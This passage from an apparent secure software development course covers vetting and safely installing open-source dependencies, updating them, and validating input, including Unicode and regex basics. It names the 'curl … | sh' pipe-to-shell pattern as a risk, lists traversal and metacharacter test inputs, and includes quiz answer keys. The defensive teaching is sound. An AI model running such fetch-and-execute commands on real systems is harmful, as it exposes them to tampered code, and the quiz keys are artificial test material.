    4. Is there evidence that the software is malicious? Per [_Backstabber’s Knife Collection_](https://arxiv.org/abs/2005.09535), check the installation scripts/routines for maliciousness, check for data exfiltration from **~/.ssh** and environment variables, and look for encoded/ obfuscated values that are executed. Examine the most recent commits for suspicious code (an attacker may have added them recently).
    5. Consider running the software in a sandbox to attempt to trigger and detect malicious code.
    6. Consider running all defined test cases to ensure the software passes them.

Other resources you may wish to consider include:

1. [The Tidelift guide to choosing packages well (February 2021)](https://tidelift.com/subscription/choosing-open-source-packages-well), Tidelift
2. [How to Evaluate Open Source Software / Free Software (OSS/FS) Programs](https://dwheeler.com/oss_fs_eval.html)

There are many places where some of this information can be found (beyond simply using a search engine). They include the projects’ home page and/or source code repository, the main page for an ecosystem’s default package repository, [deps.dev](https://deps.dev/), [metrics.openssf.org](https://metrics.openssf.org/), [libraries.io](https://libraries.io/), Synopsys Black Duck [OpenHub](https://www.openhub.net/), and Linux Foundation [LFX](https://lfx.linuxfoundation.org/).

Most of these questions also apply to closed source software that is reused.

Most software depends on other software, which in turn often depends on other software with many tiers. A software bill of materials (SBOM) is a nested inventory that identifies the software components that make up a larger piece of software. Many ecosystems have ecosystem-specific SBOM formats. There are also some SBOM formats that support arbitrary ecosystems: [Software Package Data Exchange (SPDX)](https://spdx.dev/), [Software ID (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/), and [CycloneDX](https://github.com/CycloneDX/specification). When an SBOM is available for a component you are thinking about using, it’s often easier to use that data to help answer some of the questions listed above. It’s also good to provide an SBOM to potential users of your software, for the same reasons.

> 😱 STORY TIME: Typosquatting by jeIlyfish and python3-dateutil

> On 2019-12-01 German software developer Lukas Martini discovered that two Python libraries in the popular PyPI (Python Package Index) repository implemented typosquatting attacks. These malicious packages would steal SSH and GPG private keys from developers who used them. The malicious package `jeIlyfish` imitated the non-malicious `jellyfish` package and did the damage (note that in the malicious package's name the third character is an uppercase "`I`", not a lowercase "`l`"). The same attacker also uploaded a malicious package named `python3-dateutil` which imitated the popular `dateutil` library for Python3. The malicious package `python3-dateutil` didn't include any malicious code itself, but instead loaded the malicious package `jeIlyfish` as a dependency. The malicious package `python3-dateutil` had only been on PyPI for two days, but the malicious package `jeIlyfish` had been available for nearly a year. Both libraries were removed by PyPI on the day PyPI was notified (["Two malicious Python libraries caught stealing SSH and GPG keys" by Catalin Cimpanu, ZDNet, 2019](https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/)).

#### Quiz 3.1: Selecting (Evaluating) Open Source Software

\>\>What is evidence that the software you are thinking of reusing will probably be a good choice for security? Select all answers that apply.<<

[!x] Evidence that it is easy to use securely

[x] An OSS project that has earned an OpenSSF Best Practices badge

[x] An OSS project with multiple contributors active within the past year

[ ] The software has no license statement

### Downloading and Installing Reusable Software

Of course, if you download and install a subverted version of the reused software, that could be a serious problem. So make sure that you get the *correct* version of the software:

1. Make sure you have exactly the correct name. A common attack is called “typosquatting”. In typosquatting, an attacker will create a package name or domain name that is intentionally and maliciously similar to a widely-used software component, and use that misleading name to spread a malicious version of that software. [Ohm & all, 2020](https://arxiv.org/abs/2005.09535) found that *“most malicious [OSS] packages mimic existing packages’ names via typosquatting”*. For example:

    1. Check for common misleading name changes. It is easy to switch between dash (**-**) and underscore (**&#95;**). One (**1**) and lower-case L (**l**) look similar, as do zero (**0**) and capital O (**O**). In some package managers, uppercase and lowercase ASCII are considered different; in those situations, beware of case. Unicode provides characters that appear exactly the same as ASCII, but are another alphabet, like Cyrillic or Greek; in some cases, these can also be exploited.

    2. Check how popular the package is. Generally the more-popular version is the correct version. For packages, compare the download counts of similarly-named packages. The ones with lower counts may be typosquatting attacks. Consider using a search engine to identify the most popular package or domain. However, be sure to *ignore* all advertised domains from a search engine; attackers may pay to advertise their malicious version!

    3. Check the package release date. The older one is often the one you wanted.

2. Make sure you download and install the software in a trustworthy way:

    1. You should directly download the software from its main site or from a redistribution site that you have good reason to trust (such as your Linux distribution’s repository or your programming language package manager’s standard repository).

    2. Typically this means that you should use **https:** (TLS) to download the software, not **http:**, since this generally ensures that you are contacting the site you requested and prevents attackers from modifying the software en route to you.

    3. Consider downloading the software, but then only install and use it a few days later after verifying nothing has changed. That way, if the distribution site is temporarily subverted when you download the software, but is quickly fixed, you will not be using the subverted version. This is not always practical, since you may be in too much of a hurry to wait, but in some cases this is easy to do.

    4. Try to avoid using pipe-to-shell (such as  **curl … | sh**) to download and install software. You obviously cannot download and delay installation when you use pipe-to-shell. In addition, attackers who subvert a source site can detect a pipe-to-shell request and selectively subvert pipe-to-shell users, who by definition are not reviewing what they are downloading (see [Phil's "Detecting the use of "curl | bash" server side"](https://web.archive.org/web/20230325190353/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)). Using pipe-to-shell makes source site subversions much harder to detect and counter. It also makes understanding the actual version you downloaded and installed difficult to authoritatively determine - so you have effectively lost some version control, and you cannot depend on others to be able to determine what happened. Yes, the installed program could report a version, but programs can report any number and could report the same number for different actual versions. In short, your risks increase if you use pipe-to-shell.

        That said, if you only use pipe-to-shell in a contained environment (e.g., a container or virtual machine with limited privileges) and throw away any produced executables, as it often happens in the test environments of continuous integration (CI) pipelines, pipe-to-shell is much less risky. Pipe-to-shell is also hard to avoid in some situations, depending on how the reused software is distributed, and sometimes it is not worth trying to avoid pipe-to-shell. So this is a tip that’s worth considering, but not always worth doing. **Remember**: focus on risk management, not total risk avoidance.

    5. Where important and practical, try to verify that the package is digitally signed by its expected creators (or at least its redistributors). Software to verify that a package is digitally signed, also called cryptographically signed, has been around for decades. In some situations, there is automated verification that the package does come from a particular redistributor. That said, it is often harder to ensure that you have the correct corresponding public keys (this is an example of a *key management* problem.) There is continuing work in this area, for example, the [sigstore](https://www.sigstore.dev/) project is working to make it significantly easier to digitally sign and verify software artifacts.  When you can practically create and verify digital signatures, take advantage of them.

    6. Beware of depending on being able to download and install components at run-time from other (external) locations. This is a widespread practice for many web applications, particularly for their client-side components such as JavaScript components and webfonts. However, the risk is that if that location becomes unavailable (due to attack or simply because the supplier decides to stop supporting it), your system will become unavailable. The supplier may be a large organization, but they may still choose to stop supporting what you are depending on. Before depending on something at run-time that you don’t have to, at least investigate to determine the future reliability of that service, and use a reliable service such as a well-known content distribution network (CDN).

You also need to ensure that your system is not vulnerable to a “dependency confusion” aka “substitution” attack. This vulnerability affects systems that identify a list of dependencies and are configured to retrieve those dependencies from more than one repository. Such systems are often configured to depend on some package P where the developers assumed that package P would be retrieved from one particular repository (typically a private repository). The vulnerability occurs if nothing *requires* that the package P be retrieved from its expected repository. If nothing requires it, an attacker can create a malicious package P with the same name on a *different* repository (typically a public repository), and fool the system into using that malicious package instead. Attackers can take many steps to make its use likely, such as giving their malicious version a large version number. This is not a theoretical attack; attackers began widely exploiting this vulnerability in 2021. (For more information, see “[3 Ways to Mitigate Risk When Using Private Package Feeds](https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/)” by Microsoft and “[Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)” by Alex Birsan.) There are various countermeasures to dependency confusion, for example:

1. Use a single feed (e.g., a single repository or registry). If there’s a single source, there’s no opportunity for confusion.
2. Clearly declare, for each package, where the package must be retrieved from. These are sometimes called “controlled scopes”.
3. Prioritize feeds so that the most trusted feed(s) are always consulted first, and then less-trusted feeds are only consulted when the more trusted feeds expressly report that the package is not found. Make sure that the less-trusted feeds never override the more-trusted feeds.
4. Use client-side verification features. One approach is to enforce dependency pinning aka version pinning, that is, requiring that a specific known version be used. This can be enforced by requiring a specific cryptographic hash value (aka a “digital fingerprint”) of a package. Another approach is integrity verification to verify that a downloaded package is identical to the first time it was downloaded.

🔔 Dependency confusion is a special case of 2021 CWE Top 25 #34, *Uncontrolled Search Path Element* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)). Relying on plugins, libraries, or modules from untrusted sources, and relying on untrustworthy content delivery networks, is considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*.


#### Quiz 3.2: Downloading and Installing Reusable Software

\>\>What are good ways to acquire software? Select all answers that apply.<<

[!x] Double-check that the name you will request is really the one you wanted (e.g., **-** and **&95;** are not swapped, **O** and **0** are not swapped, and so on)

[x] Use **https:**, not **http:**

[x] Consider downloading the software, but then only installing it a few days later after verifying there are no problems reported on that site

### Updating Reused Software

#### Updating Reused Software Components

In practice, you will have many reused software components, and they will need to be updated occasionally. Sometimes a vulnerability will be found in one, in which case you need to be notified quickly and be prepared to rapidly update. As a result, you need to manage reused components:

1. Use package managers, version control systems (such as git), build tools, and automated tests so that you can easily determine exactly what versions you have of every reused component and can rapidly update any of them.

2. Only depend on *documented* interfaces and behavior, and avoid obsolete interfaces, to maximize the likelihood of being able to update reused software when necessary.

3. *Expect* that you will be updating the software you use, including your underlying platform. It is foolish to assume that software will never need to be rapidly updated.

4. Do not modify OSS and create your own “local fork”. If a vulnerability is fixed in a later version of that OSS, it will become increasingly difficult to incorporate that fix. Instead, if you need to modify some OSS to fit your needs, work with the original upstream OSS project to get your improvements incorporated into the official version. Then newer versions of that OSS, including ones that fix vulnerabilities, will also include the capabilities you need.

5. Keep your reused software relatively up-to-date. If your reused components go very far out-of-date, then it may be very difficult to replace a vulnerable version with a fixed version.

6. Monitor to determine if any of the software versions you use has had a publicly-known vulnerability discovered. We will discuss this later in the section on software composition analysis (SCA).

> 😱 STORY TIME: Equifax

> The widely-used program Apache Struts had a critical vulnerability that was fixed on 2017-03-06 and widely reported by the computer press. The data broker Equifax was notified by Apache, US CERT, and the US Department of Homeland Security about the vulnerability, and was provided instructions on how to make the fix. However, Equifax failed to implement a timely update. *“Two months later, Equifax had still failed to patch its systems. It eventually got around to it on July 29. The attackers used the vulnerability to access the company’s databases and steal consumer information on May 13, over two months after Equifax should have patched the vulnerability.” Equifax reported that “145.5 million US customers, about 44% of the [US] population, were impacted by the breach... The attackers got access to … exactly the sort of information criminals can use to impersonate victims to banks, credit card companies, insurance companies, cell phone companies and other businesses vulnerable to fraud. As a result, all 143 million US victims are at greater risk of identity theft, and will remain at risk for years to come. And those who suffer identity theft will have problems for months, if not years, as they work to clean up their name and credit rating.”* (Bruce Schneier, [*Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html),  2017)

#### Updating How You Use Reused Software (Avoid/Replace Obsolete Interfaces)

You not only need  to update components you use, but also how you use them.

When components are updated, they sometimes replace their interface with a new/improved interface over an obsolete/deprecated interface. Where practical, you should avoid or replace any uses of the obsolete/deprecated interfaces of other components. Sometimes the interface is obsolete because of a security vulnerability. In addition, these obsolete interfaces are typically dropped over time, so if you use the obsolete interface, it may be impossible to quickly update if a vulnerability is later found.

If you are obsoleting an interface used by others, do your best to provide a long transition period where both the old and new interfaces are available. Some projects will not be able to easily switch, and it can sometimes take time. Trying to force a rapid update often backfires and causes users to *reject* your updates or delay using them, potentially leading to long-term security problems.

#### Reusing Software: Wrap-up

These are merely tips, and are by no means exhaustive. It is great that we have so much great software to reuse; modern software development would be impossible without them. However, there are a few potential security pitfalls with reused software. The practices we have discussed in this chapter will help you avoid many security problems due to reused software.

#### Quiz 3.3: Updating Reused Software

\>\>Reused software is so dangerous that you should always prefer to rewrite that software yourself when you can. True or False?<<

( ) True

(x) False

[Explanation]

This is false. Sure, there are risks when reusing software, but there are risks in writing software yourself. It is likely that you will make mistakes as well, and those who wrote the reusable software have often spent years developing expertise in that specific area. Instead of trying to rewrite everything - which would be economically impractical - you should approach reusing software as a risk management problem. You should examine your choices, including using the tips here, to make reasoned decisions.

[Explanation]

# Part I: Final Exam

* Not included as part of the free version of the course.

# Part II: Implementation

# Basics of Implementation

### Implementation Overview

You may know what your software is supposed to do (requirements) and may have a way to divide up the problem (design). But if your implementation is bad, the software is bad!

This section discusses how to implement secure software. We will do that by considering a very abstract view of a program, as illustrated by the following figure:

![Program Model](program_model.png)

**Abstract View of a Program**

Almost all programs have inputs (that you should validate), process data, call out occasionally to other programs, and eventually produce output(s). Calling out to another program creates (essentially) inputs to those other programs, and outputs from those other programs. The next few subsections will discuss each of those areas in turn. We will then discuss a few specialized topics.

Of course, just saying *“write secure code”* or *“don’t make mistakes”* is not helpful. The good news is that nearly all errors that cause vulnerabilities today can be grouped into a relatively small number of categories, and some of those categories are especially common. So as noted earlier, we can eliminate a vast majority of security vulnerabilities simply by learning about these categories, knowing how to look for them, and mitigating them. We will repeatedly mention the OWASP Top 10 List (for web applications) and CWE Top 25 List (for applications in general), as they provide a useful way to identify what is most important.

A few of the common kinds of vulnerabilities are design problems. However, most of the rest are implementation issues. As we walk through our model of a program, we will discuss the relevant kinds of vulnerabilities, including how to detect them and counter them. Once you start applying this information, you will find that many vulnerabilities vanish from your program.

Practically all programs have to accept input. So we will begin examining how to implement secure software by discussing how to securely handle inputs.

# Input Validation

This chapter describes how to validate input, including how to validate numbers and text, the importance of minimizing attack surfaces, and how to improve availability by considering the inputs.

Learning objectives:

1. Discuss the basics of input validation.

2. Understand how to validate numbers.

3. Examine key issues with text, including Unicode and locales.

4. Explain how to use regular expressions to validate text input.

5. Understand the importance of minimizing attack surfaces.

6. Discuss secure defaults and secure startup.

7. Improve availability by considering the inputs.

## Input Validation Basics

### Input Validation Basics Introduction

Some inputs are from untrustable users, and those inputs (at least) must be validated before being used. If you prevent invalid data from getting into your program, it will be much harder for attackers to exploit your software. Input validation can also prevent many bugs and make your program simpler. After all, if your program can immediately reject some malformed data, you don’t have to write the code to deal with those special cases later. That saves time, and such special-case code is more likely to have subtle errors.

It can also be a good idea to check inputs from trusted users. Even trusted users make mistakes, and immediately catching those mistakes can make the system more reliable. There is debate on how much validation should be done on the inputs from trusted users. On one hand, trusted users can clearly make mistakes, and validation can prevent costly mistakes. On the other hand, if too much time is spent on validating inputs from trusted users, perhaps other more-important tasks will be skipped, and sometimes trusted users need to be able to do unusual things to respond to unexpected events. Where it is not too time-consuming, it is probably best to do at least some input validation on inputs from trusted users too. For the purpose of this course, we will focus on validating input from untrusted users. Just remember that the same techniques can also be applied to trusted inputs.

First, make sure that you identify all inputs from potentially untrusted users, so that you validate them all. Where you can, eliminate the inputs or make it impossible for untrusted users to provide information to them. We discussed this earlier as the design principle *minimize the attack surface*.

At each remaining input from potentially untrusted users you need to validate the data that comes in. These input validation checks are a kind of security check, so you need to make sure that these input validation checks are non-bypassable, as we discussed earlier in the design principle *non-bypassability*. **As a reminder:** only trust security checks (including input validation) when they run on an environment you trust. This is especially important for JavaScript programs - since JavaScript can run on web browsers, it is easy to send security checks to the web browser and forget that *attackers* can control their own web browsers. Any input validation checks you do in an untrusted environment cannot be trusted. If you trust your server environment and not the client environment, then all security-relevant checks must be done in the server environment. We discussed this already, but it is important to emphasize because it is such a common and serious problem. Now let’s move on to how to actually validate input.

### How Do You Validate Input?

You should determine what is legal, as narrowly as you reasonably can, and reject anything that does not match that definition. Using rules that define what is legal, and by implication rejecting everything else, is called *allowlisting* (the rules themselves are an *allowlist*). Synonyms are *goodlisting* (the rules are the *goodlist*) and the historically common *whitelisting* (the rules are the *whitelist*). In general, do not do the reverse. That is, it is normally a mistake to try to identify what is illegal and write code to reject just those cases. This generally insecure approach, where you try to list everything that should be rejected, is called *denylisting* (the rules are a *denylist*). Synonyms for denylisting are *badlisting* and the historically common *blacklisting* (the rules are then called a *badlist* or  *blacklist*). Denylisting typically leads to security vulnerabilities, because if you forget to handle one or more important cases of illegal input, it could be an opportunity for an attacker. If you forget to allow a case, you get a bug report and your software fails securely. Besides, it is usually much easier to simply identify *what is allowed* and only allow those inputs. In a few rare cases you *can* absolutely be certain that you have enumerated all possible bad inputs, in which case denylisting is okay, but those are rare. Generally denylisting leads to trouble.

🔔 Improper input validation is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #3 and 2021 CWE Top 25 #4. It is also identified as [CWE-20](https://cwe.mitre.org/data/definitions/20.html) (*Improper Input Validation*).

The good news is that it usually does not take long to add input validation, and that can immediately make your program harder to attack. It may be hard to decide on a user-friendly response to invalid input, but it is easier than suffering a successful attack.

There is a good reason for identifying *illegal* values; use them as a set of tests to be sure that your validation code is thorough. These tests may possibly just be executed in your head, but at least a few should become test cases in your automated test suite. When we set up an input filter, we mentally attack our allowlist with a few pre-identified illegal values to make sure that a few obvious illegal values will not get through. Depending on the input, here are a few examples of common illegal values that your input filters may need to prevent: the empty string, “**.**”, “**..**”, “**../**”, anything starting with “**/**” or “**.**”, anything with “**/**” or “**&**” inside it, common metacharacters (like semicolon, single quote, double quote, and the less-than symbol), and any control characters (especially the NUL character and newline). Where numbers are expected, checking for other kinds of text that should not be allowed. Also check for very, very long inputs.

Later, we will discuss various kinds of security analysis tools. One kind, fuzzers, intentionally create a large number of malicious inputs that (among other things) test the quality of your input validation checks. But fuzzers do not guarantee to find all input validation problems. Instead, carefully implement your input validation, and then use tools to help you find problems you would have otherwise missed.

Again, your code should use *allowlisting* (narrowly identifying what is legal and reject the rest), not *denylisting* (trying to identify bad inputs). Try to make that allowlist pattern as narrow as possible, including limiting the maximum input length (and minimum input length if appropriate).

#### Quiz 1.1: How Do You Validate Input?

\>\>In general, you should validate inputs from untrusted users by:<<

(!) Rejecting patterns that are known to be malicious.

(x) Identifying a strict pattern of what is permitted and rejecting any input that does not meet it.

[Explanation]

In general, you should use *allowlisting*, not *denylisting*. Attackers can always come up with another attack, so trying to come up with a list of “everything that should be denied” is a never-ending task. It is generally better to narrowly determine what should be allowed, and then reject everything else.

[Explanation]

## Input Validation: Numbers and Text

### Input Validation: A Few Simple Data Types

So, how do you do input validation that uses an allowlist (that is, a pattern that is as narrowly-defined as possible)? In short, you do it on each input, and what you check for depends on the type of data. Let’s discuss a few common cases next.

#### Numbers

One common input is a sequence of characters representing a number. Typically, you check numbers (especially integers) to make sure they are between a minimum and maximum value. It is good to do some checking before you convert the text to a number, but in this particular case, check the value *after* converting to a number, to be certain that the *rest* of the program will only see that number if it is in a valid range. Common minimums are 0 and 1. If the number is supposed to be an integer, make sure it is an integer and reject anything else.

Where practical, store the numeric result in a type that is narrowly defined for the purpose. For example, store the number in an integer type if the number is an integer, use an unsigned type if negative numbers are not allowed, and so on. If you have to accept floating point data from an untrusted user (and try not to!), store it in an appropriate type and watch out for its many special cases (such as NaN, infinities, negative 0, underflows, and overflows). For example, normally the floating point value NaN is not equal to any value; it is not even equal to itself. Limiting the type is not always practical because this is very language-dependent; not all languages have such types. For example, JavaScript does not have an unsigned type.

Note that *“only allow an integer between 0 and 200 including those endpoints”* is an allowlist; you have identified the pattern of what is allowed, and anything else will be rejected.

#### Well-Known Special Text Formats

Sometimes your inputs are text with a standard format and there is a library that can do the validation for you. For example, most languages have some routine that can check the format of email addresses. When you have one you can trust, use it!

Sometimes the validation libraries you can use require some configuration. Again, configure them to be as narrow (limiting) as possible. For example, if you accept HTML, limit it to only the tags and attributes that you need. Often when you accept HTML, you need to only accept a few tags (e.g., **&lt;i>** for italics, **&lt;b>** for bold, **&lt;a>** for hyperlinks) and attributes (e.g., the **href** attribute of the **&lt;a>** tag so that you can say where to link to, and maybe an **id** attribute so others can refer to a particular point). Then, when an attacker tries to provide HTML with other tags (for example, a malicious **&lt;script>**), the validator simply will not accept it at all.

Some input formats are composite structures of a lot of other data. For example, JSON, XML, and CSV files can contain lots of other data. You would typically use a trustworthy library to examine and extract the portions of the data you need, and then you would validate each piece. So again, if you extract a sequence of characters representing a number, you would validate the number (e.g., to see if it is within the minimum and maximum range). In many cases, it is a text value. We will further discuss handling composite structures later, but at some point, they will decompose to specific values, often as numbers or text.

Many programs need to validate text fields, but those fields’ rules are not defined in a pre-existing library. Some tools allow us to easily handle them, but to use them, we need to understand some background. We will first need to discuss more about text, unicode, and locales in general. Then we will discuss text validation in general and the common way of doing so - regular expressions.

#### Quiz 1.2: Input Validation: A Few Simple Data Types

\>\>Select all the good practices for validating an input number from an untrusted source:<<

[!x] Check that it is at least as large as the minimum.

[x] Check that it is at most as large as the maximum.

[x] Use an unsigned type if your language supports it and the input is not allowed to be negative.

[x] Require that the number be an integer if that is the only expected kind of number.

### Sidequest: Text, Unicode, and Locales

[[OPTIONAL]]

Often you receive text as input (either directly or as part of some larger structure). We will describe text as simply a sequence of characters. If the text input is untrusted, you then need to validate that text. To understand this, we must understand what text *is*. A remarkably large number of developers have never learned much about text - even though it is one of the most common data types - so let’s make sure you understand that first. If you are already confident you are familiar with text issues such as Unicode, encoding, and locales, feel free to skip on.

#### Code Points and Encoding

Digital computers do not directly handle characters; we instead need to assign a number to each character. Different character sets with different assignments were created for different languages, and this created interoperability nightmares. In the vast majority of cases today you will use the character assignments specified by Unicode and ISO/IEC 10646, which define a Universal Character Set (UCS) that assigns a unique number (*code point*) for every character. For example, they assign the Latin character capital “A” the decimal number 65.

Historically, it was thought that 16 bits would be enough to identify all characters, but this was mistaken and was changed in 1996 (they now use 21 bits to encode any character). As a result of this mistake, some programming languages have a “character” type (e.g., Java’s **char**) that is only 16 bits long. A 16-bit data type cannot, by itself, store any arbitrary 21-bit character, so in programming languages and APIs with a 16-bit “character”, a “character” is sometimes only half of an actual character.

Text that uses these assignments need to be exchanged using an *encoding*. There are five standard encodings for Unicode: UTF-32 (big-endian and little-endian), UTF-16 (big-endian and little-endian), and UTF-8. Generally, you should use UTF-8 unless you have a reason to do otherwise. UTF-16 and UTF-32 both have two forms: “little endian” and “big endian”. If you don’t know if the recipient expects big-endian or little-endian, you should add a *byte order marker* at the beginning of the text to make sure that the receiver interprets it correctly, and when receiving UTF-16 or UTF-32, your application needs to pay attention to that. A critical issue is that some sequences of bytes are *not* valid, so when we do input validation, we will need to ensure that the data we receive is valid for the encoding we expect.

#### Locales

Interpreting characters is more complicated than you might think. Much depends on the “locale”, which defines the user’s language, country/region, user interface preferences, and probably character encoding. For example, on Unix/Linux systems, Australian English with UTF-8 encoding is represented as the locale **en_AU.UTF-8**. Locale is important, because it affects how characters are interpreted. For example, it affects:

* Collation (sorting) order

* Character classification (what is a “letter"?). Ranges like “A-Za-z” do not list *all the alphabetic characters* in arbitrary locales. If you use the C or POSIX locale and are only processing ASCII characters, then that range is the complete list of alphabetic characters, but that is not true in general.

* Case conversion (what is upper/lower case of a character, if it exists?). Note that even if there is a conversion, it might not convert to a single character in a given locale.

If you want to interpret text in the same way regardless of locale, the usual solution is to use the “C” aka “POSIX” locale - however, be careful, because that is not always what the user wanted.

Case conversion is especially fraught. Some languages don’t have upper and lower case letters. Even if they do, the mapping between them is different between different locales. So the uppercase version of a letter is *not* fixed - it is based on the locale!

A great example of this are the Turkic languages that use the Turkish alphabet. In this alphabet dotted and dotless “I” are distinct letters with upper and lower case forms. For example, lowercase dotted “i” when capitalized becomes capital dotted “İ” (not uppercase dotless “I” as it does in an English locale), and uppercase dotless “I” when lowercased becomes lowercase dotless “ı”. Note that “i” and “I” are *not* equal in a case-insensitive match in a correctly-implemented system for such locales. This has resulted in several security vulnerabilities, and we will occasionally mention this in the course because it is a great example of the kinds of mistakes that can happen if you are not aware of it.

If you want to know if “two sequences of characters are equivalent” ignoring case, then in the general case you need to call a routine to do this *and* provide it the locale to use. This raises the issues about equivalence in general, which we will discuss next.

#### Unicode Equivalence

Many programmers assume that if a sequence of text “code points” are different, they are different strings. While that is fine for some purposes, that is the wrong mental model for others, even if you assume that you want a “case sensitive” match. Unicode had to be developed in a way that was compatible with pre-existing standards, and that led to some complications.

In some cases you should use library routines to test for Unicode canonical equivalence. That is because there are some code points, or sequences of code points, that in many circumstances should be considered *equivalent* in the sense that they should always appear identical, even if they have different underlying values. For example, the code point U+006E (the Latin lowercase “n”) followed by U+0303 (the combining tilde “◌̃”) is canonically equivalent to code point U+00F1 (“ñ”).  Another example is the character “Å” that can be represented as U+00C5 (the letter “LATIN CAPITAL LETTER A WITH RING ABOVE”) or as U+212B (“ANGSTROM SIGN”): these two values should be considered equivalent.

In some other cases, you should use routines to test for Unicode compatibility. That is because there are some sequences that might appear different but would have the same underlying meaning. For example, the code point U+FB00 (typographic “ﬀ”) is compatible, but not equivalent, to U+0066 U+0066 (two Latin “f” letters). Equivalent strings are always compatible, but compatible strings are not always equivalent.

This is a pain, so the Unicode standard defines text normalization procedures, called Unicode normalization. Unicode normalization turns equivalent or compatible sequences into the exact same sequence of characters. There are 4 normalization forms:

* NFD (Normalization Form Canonical Decomposition)<br>Characters are decomposed by canonical equivalence, and multiple combining characters are arranged in a specific order.

* NFC (Normalization Form Canonical Composition)<br>Characters are decomposed and then recomposed by canonical equivalence.

* NFKD (Normalization Form Compatibility Decomposition)<br>Characters are decomposed by compatibility, and multiple combining characters are arranged in a specific order.

* NFKC (Normalization Form Compatibility Composition)<br>Characters are decomposed by compatibility, then recomposed by canonical equivalence.

From a security point-of-view it normally does not matter *which* Unicode normalization you use, but if you want to determine if two strings are equal, you need to be *consistent* about the normalization you use when comparing them. Also note that once you normalize a sequence of characters, you cannot in general regenerate exactly the original sequence.

#### Visual Spoofing

*Visual spoofing* happens when two different strings are mistaken as being the *same* by the user. Attackers will sometimes use visual spoofing as part of an attack.

Visual spoofing can even happen in the ASCII subset of Unicode. The digit “0” looks like the uppercase letter “O”, and the digit “1” looks like the lowercase letter “l”. For example, an attacker might try to create a malicious **paypa1.com** domain instead of **paypal.com**. The sequence “rn” is sometimes misread as the letter “m”! That said, most users of Latin alphabets are aware of these problems, and many fonts take care to make them more distinguishable.

But once we move beyond the ASCII subset, many other tricks exist:

* Decomposition<br>“ƶ” may be expressed as U+007A U+0335 (z + combining short stroke overlay) or as U+01B6. This means that different sequences of bytes may still indicate the same letter (and thus look identical). Normalization solves this problem.

* Mixed-script<br>Greek omicron & Latin “o” typically look the same, even though they are in different sections of Unicode.

* Same-script<br>Some characters simply look similar. E.g., “-” Hyphen-minus U+002D vs. hyphen “‐” U+2010.

* Bidirectional Text Spoofing<br>Some languages are mostly right-to-left, but switch in certain situations to left-to-right. Thus, Unicode includes mechanisms to indicate direction. But this means that the string “olleh”, surrounded by “use right-to-left”, will visually look the same as “hello”.

Visual spoofing can be very challenging to counter in general. Normalization and using distinctive fonts is not always enough, but it can sometimes be very helpful.

#### Quiz 1.3: Sidequest: Text, Unicode, and Locales

\>\>In Unicode a character is represented by a 16-bit value. True or False?<<

( ) True

(x) False

[Explanation]

There are simply too many characters to encode them all in 16 bits, so Unicode now uses 21 bits to encode characters. Many languages and APIs use 16-bit “character” values, but if they are to represent all Unicode characters, sometimes these characters are only *part* of an actual character.

[Explanation]

### Validating Text

Now that we have an understanding about text, let’s talk about validating it. In almost all cases there are at least two checks to do on text from an untrusted source:

* Validate that the text is in the expected text encoding. As noted earlier, unless you have a reason to do otherwise, we recommend using the UTF-8 encoding. UTF-8 will let you work with scripts from arbitrary languages, is backwards-compatible with ASCII, and is widely supported. UTF-8 is a good encoding, but not every sequence of bytes is valid UTF-8. Many vulnerabilities have occurred because a system accepted bytes from an attacker that are not valid UTF-8. So it is really important to validate UTF-8 text before you accept it from an untrusted source.

* Check if it is within the minimum and maximum lengths, if there are minimum and maximum lengths. Many systems will want to have a maximum simply to prevent attackers from sending absurdly-large amounts of data.

In some cases it may be very difficult to check much more. Personal names, in particular, are challenging, especially if you must deal with names in all locales. Many locales have conventions that are different from other locales; for example, is the given name or the surname (e.g., family name) listed first? There may not even be a surname or a given name. Names may contain spaces (even within a given name or surname), and, of course, there is no guarantee that the name uses only Latin or Chinese characters. For a discussion of the challenges, see the [*Falsehoods Programmers Believe About Names – With Examples*](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/) article by Tony Rogers (2018).

In many cases, though, there is more that you should do to validate text. In many cases, text values have additional rules they need to obey, and those rules vary depending on each text input.

Sometimes the text value must be one of a short list of values. That’s easy, just store the allowed collection somewhere (e.g., in a set or dictionary). Then, every time you receive input, validate that the input is one of the allowed values.

But that leaves us with the many text inputs that have rules, but they are not just a list of allowed values. They may be dates, times, part numbers, phone numbers, locations, and a host of other kinds of data. We still need to validate those inputs, and many programs have many different kinds of data. That means we need some way to *easily* describe those validation rules. The common tool for this purpose is regular expressions. In the next unit, we will optionally explain regular expressions (regexes) if you are not familiar with them; the unit after that will explain how to use regular expressions to validate inputs.

### Introduction to Regular Expressions

[[OPTIONAL]]

If you already know about regular expressions, feel free to skip this unit.

A regular expression (a *regex*) is a sequence of characters that defines a text pattern. Practically all programming languages have a built-in system or easily-acquired library that implements a regular expression language, so it is usually easy to start using regular expressions in a program regardless of how it is implemented.

However, some software developers have never used regexes. This unit provides a brief introduction if you are not already familiar with them. If you already understand regexes, feel free to skip to the next unit!

Historically regexes were developed to make it easy to search for text, though they are now often used to determine if some text matches a pattern. There are many implementations of regex systems, but since they all come from the same historical root they have much in common.

The most trivial rule is that a letter or digit matches itself. That is, the regex “**d**” matches the letter “**d**”. Most implementations use case-sensitive matches by default, and that is usually what you want.

Another rule is that square brackets surround a rule that specifies any of a number of characters. If the square brackets surround just alphanumerics, then the pattern matches any of them. So **[brt]** matches a single “**b**”, “**r**”, or “**t**”.

The pattern “**.**” matches any one character, with the possible exception of the newline character. If you want to match a literal period, precede it with a backslash (“**\.**”). Practically every implementation of regexes has a mechanism to let you decide if “**.**” should match a newline.

A regex pattern is usually a sequence of rules, stated one after the other. For example, the regex pattern “**ca[brt]**” will match the text “**cab**”, “**car**”, or “**cat**”, because the letters “**c**” and “**a**” match themselves, and “**[brt]**” matches a single “**b**”, “**r**”, or “**t**”.

